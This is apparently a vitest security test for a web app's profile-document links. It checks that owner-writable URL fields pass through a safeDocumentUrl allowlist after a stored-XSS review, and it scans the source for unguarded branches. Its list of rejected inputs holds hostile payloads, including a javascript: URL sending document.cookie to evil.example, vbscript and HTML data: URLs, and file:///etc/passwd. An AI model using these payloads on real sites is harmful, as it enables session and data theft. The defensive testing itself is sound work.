// @mutate src/components/profile/CredentialsTab.tsx | const safe = safeDocumentUrl(path); | const safe = path;
import { describe, expect, it } from "vitest";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join, resolve } from "node:path";
import { safeDocumentUrl } from "@/lib/storagePath";

/**
 * CLASS CHECK: a stored value that is not a storage path reaches the DOM (href,
 * src, window.open) only through safeDocumentUrl().
 *
 * 12285cc92 stopped POSTing `data:` URLs to Storage's sign endpoint by showing
 * any non-storage-path value "as-is". Those columns (profiles.id_document_url,
 * helper_credentials.license_url / insurance_url) are writable by their owner
 * with no shape CHECK, so `javascript:…` rendered as an admin-facing href — and
 * React 18 + CSP 'unsafe-inline' run it on click (review, 2026-09-23).
 *
 * Every `if (!isStorageObjectPath(x)) { … }` branch in src/ must either drop the
 * value (return null / throw) or pass it through safeDocumentUrl.
 */
const SRC = resolve(__dirname, "..");

function walk(dir: string, out: string[] = []): string[] {
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    if (statSync(p).isDirectory()) walk(p, out);
    else if (/\.tsx?$/.test(name) && !/\.test\.tsx?$/.test(name)) out.push(p);
  }
  return out;
}

/** The body of each `if (!isStorageObjectPath(...)) …` branch, as text. */
export function unsafeBranches(source: string): string[] {
  const out: string[] = [];
  for (const m of source.matchAll(/if\s*\(\s*[^)]*!\s*isStorageObjectPath\(([^)]*)\)\s*\)\s*/g)) {
    const start = m.index! + m[0].length;
    let body: string;
    if (source[start] === "{") {
      let depth = 0;
      let end = start;
      for (; end < source.length; end++) {
        if (source[end] === "{") depth++;
        else if (source[end] === "}" && --depth === 0) break;
      }
      body = source.slice(start, end + 1);
    } else {
      body = source.slice(start, source.indexOf(";", start) + 1);
    }
    const drops = /^\{?\s*(return\s+(null|undefined|false)?\s*;|throw\b)/.test(body.trim());
    if (!drops && !/\bsafeDocumentUrl\(/.test(body)) out.push(body.trim().split("\n")[0]);
  }
  return out;
}

describe("a non-storage-path value reaches the DOM only via safeDocumentUrl", () => {
  it("every !isStorageObjectPath branch in src/ drops the value or allowlists it", () => {
    const offenders: string[] = [];
    let branches = 0;
    for (const file of walk(SRC)) {
      const src = readFileSync(file, "utf8");
      if (!src.includes("isStorageObjectPath(")) continue;
      branches += (src.match(/!\s*isStorageObjectPath\(/g) ?? []).length;
      for (const b of unsafeBranches(src)) offenders.push(`${file.slice(SRC.length + 1)}: ${b}`);
    }
    expect(branches, "found no guarded branches — the scan is broken").toBeGreaterThanOrEqual(6);
    expect(offenders).toEqual([]);
  });

  it("is RED on the shape 12285cc92 shipped", () => {
    const asShipped = `if (!isStorageObjectPath(path)) {\n  window.open(path, "_blank", "noopener");\n  return;\n}`;
    expect(unsafeBranches(asShipped)).toHaveLength(1);
    const guarded = `if (!isStorageObjectPath(path)) {\n  const safe = safeDocumentUrl(path);\n  if (safe) window.open(safe);\n  return;\n}`;
    expect(unsafeBranches(guarded)).toHaveLength(0);
    expect(unsafeBranches(`if (!isStorageObjectPath(path)) return null;`)).toHaveLength(0);
  });

  it("safeDocumentUrl passes only https: and raster data: images", () => {
    expect(safeDocumentUrl("https://example.com/doc.pdf")).toBe("https://example.com/doc.pdf");
    expect(safeDocumentUrl("data:image/png;base64,iVBORw0KGgo=")).toBe("data:image/png;base64,iVBORw0KGgo=");
    for (const bad of [
      "javascript:fetch('https://evil.example/?c='+document.cookie)",
      " JavaScript:alert(1)",
      "vbscript:msgbox(1)",
      "data:text/html;base64,PHNjcmlwdD4=",
      "data:image/svg+xml;base64,PHN2Zz4=",
      "http://example.com/x.png",
      "//evil.example/x.png",
      "blob:https://app/x",
      "file:///etc/passwd",
      "https://ok.example/\njavascript:alert(1)",
      "",
      null,
    ]) {
      expect(safeDocumentUrl(bad as string | null), String(bad)).toBeNull();
    }
  });
});
